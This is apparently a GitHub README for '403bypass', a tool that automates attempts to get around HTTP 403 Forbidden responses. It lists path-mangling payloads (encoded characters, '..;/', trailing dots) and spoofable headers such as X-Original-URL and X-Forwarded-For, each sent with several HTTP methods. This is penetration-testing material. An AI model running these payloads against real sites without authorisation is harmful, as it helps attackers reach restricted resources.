# 403bypass

A tool that automates 403 bypassing techniques. 

# Usage

```bash
echo "https://target.com/this/is/a/403/page" | 403bypass
```

```bash
cat urls.txt | 403bypass
```

# Installation

1 - Install httpx (https://github.com/projectdiscovery/httpx)

2 - `curl https://raw.githubusercontent.com/felipecaon/403bypass/main/403bypass > /usr/local/bin/403bypass`

3 - `chmod +x /usr/local/bin/403bypass`

# Workflow

Generates a list of known payloads:

```
http://example.com
http://example.com/.
http://example.com/./
http://example.com/*
http://example.com..;/
http://example.com;/
http://example.com/%20
http://example.com/%2e
http://example.com/~
http://example.com/%09
http://example.com/.json
http://example.com/<encoded>
http://example.com.json
http://<domain-api>.com
http://example.com/.;/
http://example.com/#
http://example.com/?gg
http://example.com/%20/
http://example.com/%2e/
http://example.com/./
http://example.com//
https://example.com
```

The payloads above are requested using `GET`, `POST` and `PUT` methods. Additionaly, every request is made using a potentially vulnerable header from the list:

## Headers:
```
X-Forwarded-For
X-Forwarded-Host
X-Custom-IP-Authorization
X-Custom-IP-Authorization+..;/
X-Original-URL
X-Rewrite-URL
X-Originating-IP
X-Remote-IP
X-Client-IP
X-Host
X-Remote-Addr
```

# Contributing

Feel free to open issue or PR with additional payloads.


# Credits

Main structure is made by Raywando, https://github.com/Raywando/4xxbypass